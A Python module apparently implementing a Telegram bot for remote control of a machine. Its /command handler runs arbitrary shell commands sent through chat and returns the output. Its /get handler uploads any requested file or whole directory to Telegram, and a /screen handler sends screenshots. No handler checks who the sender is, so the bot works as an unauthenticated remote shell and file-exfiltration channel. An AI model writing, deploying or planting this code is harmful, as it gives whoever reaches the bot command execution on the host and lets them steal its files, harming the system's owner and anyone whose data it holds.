import os
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
import subprocess
from pathlib import Path
from .logging import LOGGER

class Bot():
   
    def __init__(self, token: str):
        self.token = token
        application = ApplicationBuilder().token(token).build()
    
        ping_handler = CommandHandler('ping', self.ping)
        application.add_handler(ping_handler)

        command_handler = CommandHandler('command', self.command)
        application.add_handler(command_handler)

        screen_handler = CommandHandler('screen', self.screen)
        application.add_handler(screen_handler)

        getfile_handler = CommandHandler('get', self.getfile)
        application.add_handler(getfile_handler)

        application.run_polling()

    async def ping(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Bot is alive")

    async def command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        _ret = ""
        if context.args:
            #_args = ' -- '.join(context.args)
            cmd = context.args
            try:
                results = subprocess.run(cmd, capture_output=True, text=True)
                _ret = results.stdout if results.stdout else results.stderr                
            except Exception as ex:
                _ret = str(ex)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=_ret)

    async def screen(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        LOGGER.info('---> screen')
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo="/tmp/screenshot.png")

    async def getfile(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """
        /get dir1 /dir2/file1 dir3
        """
        if context.args:
            for _obj in context.args:
                if os.path.isfile(_obj):
                    _document = open(str(_obj), 'rb')
                    await context.bot.sendDocument(chat_id=update.effective_chat.id, document=_document)
                elif os.path.isdir(_obj):
                    for _file in self.list_directory_files_path(src=Path(_obj)):
                        _document = open(str(_file), 'rb')
                        await context.bot.sendDocument(chat_id=update.effective_chat.id, document=_document)


    def list_directory_files_path(self,
        src: Path
    ) -> list[Path]:
        return [
            Path(src) / Path(name)
            for name in os.listdir(src)
            if os.path.isfile(Path(src) / Path(name))
        ]

